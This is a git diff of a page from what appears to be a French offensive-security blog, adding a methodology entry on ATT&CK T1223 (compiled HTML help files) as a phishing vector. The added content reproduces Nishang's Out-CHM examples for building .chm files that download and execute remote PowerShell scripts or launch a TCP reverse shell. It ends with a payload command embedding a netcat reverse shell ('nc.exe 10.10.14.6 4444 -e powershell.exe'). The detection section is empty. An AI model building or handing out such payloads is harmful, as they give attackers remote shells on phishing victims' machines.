@@ -9,7 +9,7 @@
 
     <link rel="icon" href="/images/favicon.png" type="image/png">
 
-    <title>Tags :: Another InfoSec Blog</title>
+    <title>T1223 - Fichier HTML Compilé :: Another InfoSec Blog</title>
 
     
     <link href="/css/nucleus.css?1584987425" rel="stylesheet">
@@ -35,7 +35,7 @@
     </style>
     
   </head>
-  <body class="" data-url="/tags/">
+  <body class="" data-url="/methodologies/execution/t1223_-compiled_html_file/">
     <nav id="sidebar" class="">
 
 
@@ -236,7 +236,7 @@
   
     
     <li data-nav-id="/methodologies/" title="Méthodologies" class="dd-item 
-        
+        parent
         
         
         ">
@@ -263,7 +263,7 @@
   
     
     <li data-nav-id="/methodologies/execution/" title="Execution" class="dd-item 
-        
+        parent
         
         
         ">
@@ -287,7 +287,7 @@
  
   
     
-      <li data-nav-id="/methodologies/execution/t1223_-compiled_html_file/" title="T1223 - Fichier HTML Compilé" class="dd-item ">
+      <li data-nav-id="/methodologies/execution/t1223_-compiled_html_file/" title="T1223 - Fichier HTML Compilé" class="dd-item active">
         <a href="/methodologies/execution/t1223_-compiled_html_file/">
         T1223 - Fichier HTML Compilé
         
@@ -403,7 +403,19 @@
             
           
           
-            <a href='/'>Acceuil</a> > Tags
+            
+            
+          
+          
+            
+            
+          
+          
+            <a href='/'>Acceuil</a> > <a href='/methodologies/'>Méthodologies</a> > <a href='/methodologies/execution/'>Execution</a> > T1223 - Fichier HTML Compilé
+          
+         
+          
+         
           
          
           
@@ -414,7 +426,17 @@
                 
                     <div class="progress">
     <div class="wrapper">
-
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#procédure">Procédure</a>
+      <ul>
+        <li><a href="#--nishanghttpsgithubcomsamratashoknishang">- <a href="https://github.com/samratashok/nishang">Nishang</a></a></li>
+      </ul>
+    </li>
+    <li><a href="#détection">Détection</a></li>
+  </ul>
+</nav>
     </div>
 </div>
 
@@ -430,7 +452,7 @@
           
             <h1>
               
-              Tags
+              T1223 - Fichier HTML Compilé
             </h1>
           
 
@@ -438,15 +460,96 @@
 
 
 
+<h1 id="t1223---fichier-html-compilé">T1223 - Fichier HTML Compilé</h1>
+
+<div class="notices info" ><p><strong>ID</strong>:  T1223
+<strong>Tactique</strong>: Exécution,Evasion
+<strong>Plateforme</strong>:  Windows
+<strong>Autorisations requises</strong>:  Utilisateur
+<strong>Type de Défense contourné</strong>: 
+<strong>Version</strong>:  1
+<strong>Création</strong>:  23/03/2020
+<strong>Dernière modification</strong>:  17/03/2020</p>
+</div>
+
+<h2 id="description">Description</h2>
+<p>Les fichiers HTML compilés avec une extenstion (.chm) peuvent êter utilisé comme vecteur de phishing.</p>
+<h2 id="procédure">Procédure</h2>
+
+<div class="notices tip" ><p>$ip = adresse IP 
+$port = Port attaquants</p>
+</div>
+
+<h3 id="--nishanghttpsgithubcomsamratashoknishang">- <a href="https://github.com/samratashok/nishang">Nishang</a></h3>
+
+<div class="notices warning" ><p>Le compilateur <a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138">htmlhelp.exe</a>  est nécessaire il faut donc le télécharger et l&rsquo;installer.
+Opération compliqué sous linux (Nécessite une machine Windows).</p>
+</div>
+
+<blockquote>
+<p>Importez tous les scripts de la session PowerShell en cours (v3 ou suppérieur) :</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Powershell" data-lang="Powershell">PS C:\Users\Administrator\Desktop\nishang-master&gt; Import-Module .\nishang.psm1
+ WARNING<span style="color:#960050;background-color:#1e0010">:</span> The names of some imported commands from the module <span style="color:#e6db74">&#39;nishang&#39;</span> include unapproved verbs that might make them less discoverable. To find the commands with unapproved verbs, run the Import-Module
+ command again with the Verbose <span style="color:#66d9ef">parameter</span>. <span style="color:#66d9ef">For</span> a list of approved verbs, type Get-Verb.
+ WARNING<span style="color:#960050;background-color:#1e0010">:</span> Some imported command names contain one or more of the following restricted characters<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#75715e"># , ( ) {{ }} [ ] &amp; - / \ $ ^ ; : &#34; &#39; &lt; &gt; | ? @ ` * % + = ~</span>
+ PS C:\Users\Administrator\Desktop\nishang-master&gt;
+</code></pre></div><blockquote>
+<p>Exemples</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell"> NAME
+     Out-CHM
+ 
+ SYNOPSIS
+     Nishang script useful <span style="color:#66d9ef">for</span> creating Compiled HTML Help file (.CHM) which could be used to run PowerShell commands and scripts.
+ 
+     -------------------------- EXAMPLE 1 --------------------------
+     PS &gt;Out-CHM -Payload <span style="color:#e6db74">&#34;Get-Process&#34;</span> -HHCPath <span style="color:#e6db74">&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
+ 
+     Above command would execute Get-Process on the target machine when the CHM file is opened.
+ 
+
+     -------------------------- EXAMPLE 2 -------------------------- 
+     PS &gt;Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 -HHCPath <span style="color:#e6db74">&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
+   
+     Use above when you want to use a PowerShell script as the payload. Note that <span style="color:#66d9ef">if</span> the script expects any <span style="color:#66d9ef">parameter</span> passed to it,
+     you must pass the parameters <span style="color:#66d9ef">in</span> the script itself.
+ 
+
+     -------------------------- EXAMPLE 3 --------------------------
+     PS &gt;Out-CHM -PayloadURL http<span style="color:#960050;background-color:#1e0010">:</span>//192.168.254.1/Get-Information.ps1 -HHCPath <span style="color:#e6db74">&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
+   
+     Use above command to generate CHM file which download and execute the given PowerShell script <span style="color:#66d9ef">in</span> memory on target.
+ 
+
+     -------------------------- EXAMPLE 4 --------------------------
+     PS &gt;Out-CHM -Payload <span style="color:#e6db74">&#34;-EncodedCommand &lt;&gt;&#34;</span> -HHCPath <span style="color:#e6db74">&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
+ 
+     Use above command to generate CHM file which executes the encoded command/script.
+     Use Invoke-Encode from Nishang to encode the command or script.
+ 
+
+     -------------------------- EXAMPLE 5 --------------------------
+     PS &gt;Out-CHM -PayloadURL http<span style="color:#960050;background-color:#1e0010">:</span>//192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HHCPath <span style="color:#e6db74">&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
+
+     Use above command to pass an argument to the PowerShell script/module.
+ 
+ 
+     -------------------------- EXAMPLE 6 --------------------------
+     PS &gt;Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1
+ 
+     Use above when you want to use a PowerShell script as the payload. Note that <span style="color:#66d9ef">if</span> the script expects any <span style="color:#66d9ef">parameter</span> passed to it,
+     you must pass the parameters <span style="color:#66d9ef">in</span> the script itself.
+
+</code></pre></div><blockquote>
+<p>Création du payload</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Powershell" data-lang="Powershell">Out-CHM -Payload  <span style="color:#e6db74">&#39;C:\Docs\nc.exe 10.10.14.6 4444 -e powershell.exe&#39;</span> -HHCPath <span style="color:#e6db74">&#39;C:\Program Files (x86)\HTML Help Workshop&#39;</span>
+</code></pre></div><h2 id="détection">Détection</h2>
+<h1 id="réferences">Réferences</h1>
 
 
-
-<ul>
-	
-</ul>
-
-
-<footer class=" footline" >
+<footer class="footline">
 	
 </footer>
 
@@ -516,6 +619,7 @@
             
                 
                     
+                    
                 
                 
 
@@ -531,6 +635,7 @@
             
                 
                     
+                    
                 
                 
 
@@ -543,6 +648,7 @@
             
             
                 
+                    
                     
                 
                 
@@ -559,6 +665,9 @@
             
             
                 
+                    
+                        
+                        
                     
                 
                 
@@ -586,8 +695,10 @@
 	 
 	 
 		
+			<a class="nav nav-prev" href="/methodologies/execution/" title="Execution"> <i class="fa fa-chevron-left"></i></a>
 		
-			<a class="nav nav-next" href="/vulnerability_corner/" title="Analyse des Vulnerabilités" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
+		
+			<a class="nav nav-next" href="/methodologies/execution/t1173_dynamic_data_exchange/" title="" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
 		
 	
     </div>
@@ -617,3 +728,4 @@
 
   </body>
 </html>
+
